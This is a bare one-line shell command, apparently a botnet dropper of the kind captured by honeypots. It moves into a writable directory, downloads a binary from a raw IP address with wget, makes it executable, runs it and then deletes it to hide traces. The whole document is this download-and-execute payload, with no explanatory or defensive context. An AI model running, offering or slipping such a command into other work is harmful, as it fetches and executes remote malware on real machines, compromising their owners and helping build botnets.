cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.175.126.89/cuntytftp; chmod +x cuntytftp; ./cuntytftp; rm -rf cuntytftp
